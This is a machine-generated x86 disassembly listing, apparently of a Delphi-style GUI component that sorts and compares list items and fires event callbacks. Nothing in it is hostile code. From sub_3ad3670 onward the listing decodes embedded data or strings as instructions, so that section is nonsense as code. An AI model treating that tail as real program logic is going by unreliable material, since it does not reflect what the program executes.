cmp [ eax + 0x1c ] 0x0
je r-xdata
push esi
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x24 ]
call [ esi + 0x20 ]
jmp r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
mov edi [ ebx + 0x10 ]
test edi edi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp [ esi + 0x10 ]
test ebp ebp
je r-xdata
sub edi 0x4
mov edi [ edi ]
mov ebp [ esi + 0x10 ]
test ebp ebp
je r-xdata
sub edi 0x4
mov edi [ edi ]
push ebp
mov eax [ esi + 0x10 ]
call sub_3a65730
push eax
push edi
mov eax [ ebx + 0x10 ]
call sub_3a65730
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
sub ebp 0x4
mov ebp [ ebp ]
push ebp
mov eax [ esi + 0x10 ]
call sub_3a65730
push eax
push edi
mov eax [ ebx + 0x10 ]
call sub_3a65730
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
jmp r-xdata
sub ebp 0x4
mov ebp [ ebp ]
sub_3ad28c4
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ad29b4
mov ebp eax
mov edx edi
mov eax ebx
call sub_3ad29b4
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_3ad29b4
call sub_3a7aebc
mov esi eax
mov edx edi
mov eax ebx
call sub_3ad29b4
call sub_3a7aebc
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3ad2920
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ad28c4
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_3ad2920
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_3ad29ec
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_3a7b564
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad2a34
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3ac0b40
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_3ac0dfc
mov dl 0x1
mov eax esi
call sub_3ad2c24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad2a8c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_3ad2ba5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_3a64530
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_3a7a494
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_3a7a494
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_3a64530
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_3a7a494
pop edx
mov ecx [ eax ]
call [ ecx + 0xa4 ]
sub_3ad2bb4
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_3ad2bf0
push ebx
mov ebx eax
mov eax ebx
call sub_3a83acc
movzx eax [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_3ad2c24
pop ebx
retn
mov edx eax
mov eax ebx
call sub_3ad2d28
sub_3ad2c24
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_3ad2d94
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_3ad2cf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_3a7a494
movzx edx [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x98 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_3a7a494
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ad2d28
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ad2d94
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0xa4 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a494
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ad2df4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_3ad2e44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_3ad2f13
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d354
call sub_3a64c34
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_3a67194
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d318
call sub_3a64c34
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad2f1a
lea eax [ ebp - 0x18 ]
call sub_3a652a0
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3ad2f24
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a64530
mov eax [ eax + 0x2dc ]
call sub_3ae00c4
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ esp ]
mov edx [ eax + 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc esi
xor ebp ebp
inc ebp
dec esi
jne r-xdata
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x278 ]
call sub_3adab2c
mov ebx eax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_3ada5a8
mov eax [ esp ]
mov ecx [ eax + 0x18 ]
xor edx edx
mov eax ebx
call sub_3ada76c
mov eax [ esp ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_3ada65c
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ esp ]
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x284 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_3a7a494
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov eax [ esp ]
call sub_3a7aebc
mov edx eax
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x278 ]
call sub_3adb714
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx ebp
call sub_3a7a494
mov ebx eax
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ad30b8
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_3a7b4f8
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
cmp [ eax + 0xb0 ] 0x0
jne r-xdata
mov eax [ eax + 0x50 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
inc ebp
mov [ esp ] 0x0
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_3a64530
mov esi eax
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ esi + 0x2dc ]
call sub_3ad29b4
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ ebx + 0x18 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ ebx + 0x14 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
inc [ esp ]
dec ebp
jne r-xdata
mov eax ebx
call sub_3a7aebc
mov edx eax
mov eax [ esi + 0x20 ]
mov eax [ eax + 0x278 ]
call sub_3adabcc
mov esi eax
mov edx [ ebx + 0x10 ]
mov eax esi
call sub_3ada5a8
mov ecx [ ebx + 0x18 ]
xor edx edx
mov eax esi
call sub_3ada76c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_3ada65c
mov eax [ edi + 0x28 ]
mov eax [ eax + 0x50 ]
mov edx [ esp ]
call sub_3a7a494
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
sub_3ad31d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3ad2a34
mov eax ebx
mov edx [ eax ]
call [ edx + 0x60 ]
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3ad29ec
mov esi eax
mov [ ebx + 0xd0 ] esi
mov [ esi + 0x28 ] ebx
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3ad3234
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
lea eax [ esi + 0xd0 ]
call sub_3a6efbc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3ac0b94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3ad3270
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov esi edx
mov edi eax
test esi esi
jl r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ edi + 0xd0 ]
call sub_3a7b21c
cmp esi eax
jl r-xdata
test bl bl
je r-xdata
mov bl 0x1
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ edi + 0xd0 ]
call sub_3ad29b4
mov edx eax
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
cmp [ edi + 0xda ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx edi
mov eax [ edi + 0xdc ]
call [ edi + 0xd8 ]
sub_3ad32dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_3ad29b4
mov edx [ eax + 0x10 ]
mov eax edi
call sub_3a652f4
pop edi
pop esi
pop ebx
retn
sub_3ad3310
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0xd0 ]
call sub_3ad29b4
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop edi
pop esi
pop ebx
retn
sub_3ad3348
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3ad3374
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_3a83f44
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x10 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
cmp [ esi + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_3ad3428
sub_3ad33b8
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
pop esi
pop ebx
retn
mov eax esi
call sub_3ad3428
mov eax [ esi + 0x10 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
sub_3ad3428
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3ad356b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad3572
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov ebx [ esi + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov ebx [ esi + 0x10 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_3a64530
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc eax
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_3ad29b4
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa8 ]
inc ebx
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xac ]
mov eax [ edi + 0xd0 ]
mov edx ebx
call sub_3ad29b4
mov ecx eax
mov edx ebx
mov eax edi
call sub_3ad3270
test al al
je r-xdata
jmp r-xdata
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_3a64530
mov edi eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_3ad2df4
test al al
je r-xdata
sub_3ad3580
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3ad359f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ad35a6
retn
sub_3ad35ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_3a64530
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xe0 ]
sub_3ad3670
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdiv [ esi ]
lodsd [ esi ]
add edi esp
lodsd [ ss : esi ]
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl ch
lodsd [ ss : esi ]
add ebx [ eax + eax ]
add [ eax ] al
xor al 0x7e
cmpsd [ esi ] [ edi ]
add ecx eax
inc ebp
cmpsb [ esi ] [ edi ]
add edx esp
inc ebp
cmpsb [ esi ] [ edi ]
add ebx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx esp
inc ebp
cmpsb [ esi ] [ edi ]
add edx eax
inc ebp
cmpsb [ esi ] [ edi ]
add ebx [ eax ]
inc ebx
cmpsb [ esi ] [ edi ]
add esi [ ebx + eax * 2 ]
cmpsb [ esi ] [ edi ]
add ebp [ eax - 0x52 ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + ebp * 4 - 0x5443fc59 ]
cmpsd [ esi ] [ edi ]
add eax [ eax + 0x7803ad83 ]
test [ ebp - 0x58504bfd ] ch
add [ eax ] al
je r-xdata
add eax eax
add edx [ esi ]
add [ eax ] al
jmp eax
jae r-xdata
cmpsd [ esi ] [ edi ]
add ebx esp
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add esi [ ebx + eax * 4 ]
lodsd [ esi ]
add ecx [ esi ]
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc03a6 ] dl
add [ eax ] al
or al 0x54
push ebx
je r-xdata
mov ah 0xab
cmpsd [ esi ] [ edi ]
add edi [ ebx + ebp * 4 - 0x7c7ffc59 ]
lodsd [ esi ]
add edi [ eax - 0x7c ]
lodsd [ esi ]
add esi [ edi + ebp * 4 - 0x501bfc59 ]
add eax [ edi ]
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
and al 0x36
lodsd [ esi ]
add edx [ 0xffffffffacff0000 ]
test [ ebp + 0x103 ] ch
popad
outsb
insb
nop
cld
lodsd [ ss : esi ]
add eax [ edi ]
or al 0x54
push ebx
je r-xdata
insb
jae r-xdata
pop esp
je r-xdata
je r-xdata
add bh bh
pushfd
test [ ebp + 0x103 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al ch
jae r-xdata
add [ eax + 0x42080002 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ esi + 0x1703 ] ah
jae r-xdata
add esp esp
scasd [ edi ]
scasd [ edi ]
cmpsd [ esi ] [ edi ]
add edx [ eax + eax ]
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x65766542
insb
jle r-xdata
popad
outsb
insb
mov eax 0xc003ad36
sub_3ad4098
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
adc cl [ edi + 0x6e ]
inc ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
popad
je r-xdata
add [ eax ] al
add [ eax + 0x4f06002e ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002b ] al
outsb
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
sub [ ecx ] al
jb r-xdata
clc
cld
jne r-xdata
outsb
insb
cld
jne r-xdata
dec esp
popad
jbe r-xdata
xor al [ eax ]
or al 0x4f
outsb
sbb al 0xa3
stosb [ edi ]
add eax eax
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
clc
mov [ 0x12803aa ] eax
add [ eax ] al
cmpsb [ esi ] [ edi ]
stosb [ edi ]
add edi eax
cld
stosb [ edi ]
stosb [ edi ]
add esp [ eax ]
add [ eax ] eax
jmp [ eax ]
add ebx [ eax ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
add ebp eax
add [ eax ] al
dec edi
outsb
xchg esp eax
mov [ 0xc803aa ] eax
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
jae r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002d ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
test al 0xaa
add esi eax
add [ eax ] al
push eax
add [ eax ] al
dec ebp
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or ecx [ edi + 0x6e ]
ja r-xdata
xor [ esi ] 0x0
or [ edi + 0x6e ] cl
outsd
jbe r-xdata
dec ebp
cld
jne r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
xor [ eax ] 0x0
or ecx [ edi + 0x6e ]
cld
jne r-xdata
jo r-xdata
push eax
popad
